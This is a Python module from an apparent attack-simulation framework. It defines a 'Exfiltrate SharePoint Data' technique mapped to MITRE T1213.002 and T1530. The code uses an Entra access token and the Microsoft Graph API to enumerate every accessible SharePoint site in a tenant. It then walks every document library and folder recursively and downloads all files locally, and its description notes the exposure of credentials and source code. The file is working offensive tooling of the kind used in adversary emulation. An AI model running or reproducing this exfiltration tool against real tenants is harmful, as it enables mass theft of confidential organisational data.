from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, TechniqueNote
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple, List
from core.entra.graph_request import GraphRequest
import os
import datetime
import requests
from core.entra.entra_token_manager import EntraTokenManager

@TechniqueRegistry.register
class M365ExfilSharepointData(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1213.002",
                technique_name="Data from Information Repositories",
                tactics=["Collection"],
                sub_technique_name="Sharepoint"
            ),
            MitreTechnique(
                technique_id="T1530",
                technique_name="Data from Cloud Storage",
                tactics=["Collection"],
                sub_technique_name=None
            )
        ]
        technique_notes = [
            TechniqueNote("Technique automatically finds and exfiltrates all accessible SharePoint sites by default"),
            TechniqueNote("Set target_site parameter to focus exfiltration on a specific site by name or URL"),
            TechniqueNote("Large sites may take significant time to download; consider using target_site for initial testing"),
            TechniqueNote("Creates timestamped output directory to prevent overwrites"),
            TechniqueNote("Requires appropriate Graph API permissions (Sites.Read.All, Sites.ReadWrite.All)")
        ]
        super().__init__(
            name = "Exfiltrate SharePoint Data", 
            description = "Performs comprehensive data exfiltration from Microsoft SharePoint sites through Microsoft Graph API. By default, discovers and downloads all content from every accessible SharePoint site in the tenant, maintaining complete folder structures and metadata. Can optionally target specific sites by name or URL to limit scope. The technique systematically enumerates sites, traverses all document libraries and folders, and downloads all accessible files. This can expose sensitive organizational data including internal documentation, configurations, source code, and credentials stored in SharePoint.",
            mitre_techniques = mitre_techniques,
            notes = technique_notes
        )

    def _enumerate_sites(self, target_site: str = None) -> List[Dict[str, Any]]:
        """
        Enumerates SharePoint sites, optionally filters for a specific site.
        
        Args:
            target_site: Optional site name or URL to filter for
            
        Returns:
            List of site information dictionaries
        """
        if target_site:
            # Attempt exact match
            endpoint_url = f"https://graph.microsoft.com/v1.0/sites?search={target_site}"
        else:
            endpoint_url = "https://graph.microsoft.com/v1.0/sites?search=*"
            
        sites_response = GraphRequest().get(url=endpoint_url)

        if 'error' in sites_response:
            raise Exception(f"Failed to enumerate SharePoint sites: {sites_response['error']}")

        # If targeting specific site, filter results
        if target_site:
            filtered_sites = []
            for site in sites_response:
                if (target_site.lower() in site.get('displayName', '').lower() or 
                    target_site.lower() in site.get('webUrl', '').lower()):
                    filtered_sites.append(site)
            return filtered_sites
            
        return sites_response

    def _get_drive_items(self, site_id: str, item_id: str = None) -> List[Dict[str, Any]]:
        """
        Gets items (files/folders) from a SharePoint site drive.
        
        Args:
            site_id: ID of the SharePoint site
            item_id: Optional ID of a specific folder to list items from
            
        Returns:
            List of drive items
        """
        if item_id:
            endpoint_url = f"https://graph.microsoft.com/v1.0/sites/{site_id}/drive/items/{item_id}/children"
        else:
            endpoint_url = f"https://graph.microsoft.com/v1.0/sites/{site_id}/drive/root/children"

        response = GraphRequest().get(url=endpoint_url)
        
        if 'error' in response:
            raise Exception(f"Failed to get drive items: {response['error']}")
            
        return response

    def _download_file(self, site_id: str, file_id: str, local_path: str) -> None:
        """
        Downloads a single file from SharePoint.
        
        Args:
            site_id: ID of the SharePoint site
            file_id: ID of the file to download
            local_path: Path where file should be saved
            
        Raises:
            Exception: If file download fails
        """
        endpoint_url = f"https://graph.microsoft.com/v1.0/sites/{site_id}/drive/items/{file_id}/content"
        manager = EntraTokenManager()
        token = manager.get_active_token()
        headers = manager.create_auth_header(token)
        
        try:
            response = requests.get(url=endpoint_url, headers=headers, stream=True)
            
            # Check if response is an error message (JSON)
            if isinstance(response.content, dict):
                if 'error' in response:
                    raise Exception(f"API Error: {response['error']}")
                raise Exception(f"Unexpected JSON response: {response}")
                
            # Check if response is bytes
            if not isinstance(response.content, bytes):
                raise Exception(f"Unexpected response type: {type(response)}")

            # Ensure directory exists
            os.makedirs(os.path.dirname(local_path), exist_ok=True)
            
            # Write the file content to local path
            with open(local_path, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                
        except Exception as e:
            raise Exception(f"Download failed: {str(e)}")

    def _process_folder(self, site_id: str, folder_id: str, local_base_path: str, folder_path: str = "") -> Tuple[int, int]:
        """
        Recursively processes a folder and its contents.
        
        Args:
            site_id: ID of the SharePoint site
            folder_id: ID of the folder to process
            local_base_path: Base path for local file storage
            folder_path: Current folder path relative to base
            
        Returns:
            Tuple of (files downloaded, folders processed)
        """
        files_count = 0
        folders_count = 0
        
        items = self._get_drive_items(site_id, folder_id)
        
        for item in items:
            item_name = item.get('name', '')
            item_id = item.get('id')
            
            if item.get('folder'): # Item is folder
                folders_count += 1
                new_folder_path = os.path.join(folder_path, item_name)
                f_count, d_count = self._process_folder(
                    site_id, 
                    item_id,
                    local_base_path,
                    new_folder_path
                )
                files_count += f_count
                folders_count += d_count
            else: # Item is file
                files_count += 1
                file_path = os.path.join(folder_path, item_name)
                local_file_path = os.path.join(local_base_path, file_path)
                
                try:
                    self._download_file(site_id, item_id, local_file_path)
                except Exception as e:
                    print(f"Failed to download {file_path}: {str(e)}")
                    
        return files_count, folders_count

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        """Executes the SharePoint exfiltration technique"""
        try:
            target_site = kwargs.get('target_site')
            
            # Create timestamp-based output directory
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            base_output_dir = f"./output/sharepoint_export/{timestamp}"
            
            # Get sites based on target parameter
            sites = self._enumerate_sites(target_site)
            
            if not sites:
                if target_site:
                    return ExecutionStatus.FAILURE, {
                        "error": f"No SharePoint sites found matching '{target_site}'",
                        "message": "Failed to find matching SharePoint sites"
                    }
                else:
                    return ExecutionStatus.FAILURE, {
                        "error": "No accessible SharePoint sites found",
                        "message": "Failed to find SharePoint sites"
                    }
            
            total_stats = {
                "sites_processed": 0,
                "files_downloaded": 0,
                "folders_processed": 0,
                "sites": []
            }
            
            # Process each site
            for site in sites:
                site_info = {
                    "name": site.get('displayName', 'Unknown'),
                    "web_url": site.get('webUrl', 'N/A'),
                    "id": site.get('id')
                }
                
                try:
                    # Create site directory
                    site_dir = os.path.join(base_output_dir, site_info['name'])
                    os.makedirs(site_dir, exist_ok=True)
                    
                    # Process root folder
                    files_count, folders_count = self._process_folder(
                        site_info['id'],
                        None,
                        site_dir
                    )
                    
                    site_info.update({
                        "files_downloaded": files_count,
                        "folders_processed": folders_count,
                        "status": "success"
                    })
                    
                    total_stats["files_downloaded"] += files_count
                    total_stats["folders_processed"] += folders_count
                    
                except Exception as e:
                    site_info.update({
                        "status": "failed",
                        "error": str(e)
                    })
                
                total_stats["sites"].append(site_info)
                total_stats["sites_processed"] += 1

            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully exfiltrated {total_stats['sites_processed']} SharePoint site(s)",
                "value": {
                    "export_path": base_output_dir,
                    "stats": total_stats
                }
            }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to exfiltrate SharePoint sites"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        """Define technique parameters"""
        return {
            "target_site": {
                "type": "str",
                "required": False,
                "default": None,
                "name": "Target Site Name",
                "input_field_type": "text"
            }
        }